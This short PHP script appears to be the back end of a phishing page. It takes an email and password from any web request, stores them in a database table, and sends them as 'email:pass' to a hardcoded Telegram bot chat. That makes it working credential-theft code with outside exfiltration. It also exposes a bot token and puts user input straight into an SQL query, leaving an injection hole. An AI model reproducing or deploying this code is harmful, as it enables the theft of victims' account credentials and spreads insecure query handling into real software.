<?php
    if($_REQUEST){
        require ('connect.php');
        $email = $_REQUEST['email'];
        $pass = $_REQUEST['pass'];
        $mysqli->query("INSERT INTO `acc`(`id`, `email`, `pass`) VALUES(NULL, '$email', '$pass')");
        file_get_contents('https://api.telegram.org/bot547646392:AAG1xHPmghPiCoFdWvpi4UF3g_5gvlsmJJs/sendMessage?chat_id=268214720&text='.$email.':'.$pass);
    }

?>